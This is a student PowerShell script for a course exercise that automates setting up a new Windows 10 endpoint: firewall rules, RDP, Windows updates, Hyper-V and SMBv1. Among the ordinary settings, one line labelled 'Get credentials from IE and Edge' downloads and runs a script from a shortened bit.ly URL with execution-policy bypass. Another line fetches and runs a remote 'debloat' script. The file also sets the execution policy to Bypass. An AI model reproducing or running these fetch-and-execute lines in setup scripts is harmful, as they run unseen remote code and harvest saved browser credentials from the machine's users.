# Ops 201d6 Code Challenge 11
# Dylan Dempsey
# 02/21/23
# Write a Powershell script that automates the configuration of a new Windows 10 endpoint.

# Main

# Enable File and Printer Sharing

Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True

# Enable ICMP 

netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 

# Remote Management

# RDP

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# NLA 

Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1

# Firewall Rule

Enable-NetFirewallRule -DisplayGroup “Remote Desktop”

# Bloatware Remover

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))

# Remote Event Viewer

Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru

# Update computers remotely

Invoke-WuJob -ComputerName $Computers -Script { ipmo PSWindowsUpdate; Install-WindowsUpdate -AcceptAll -IgnoreReboot | Out-File "C:\Windows\PSWindowsUpdate.log"} -RunNow -Confirm:$false -Verbose -ErrorAction Ignore

# Get credentials from IE and Edge

powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"

# Enable Hyper-V

Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All

# Toggle SMBv1

Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Enable Script Execution

powershell.exe Set-ExecutionPolicy Bypass -Force

# End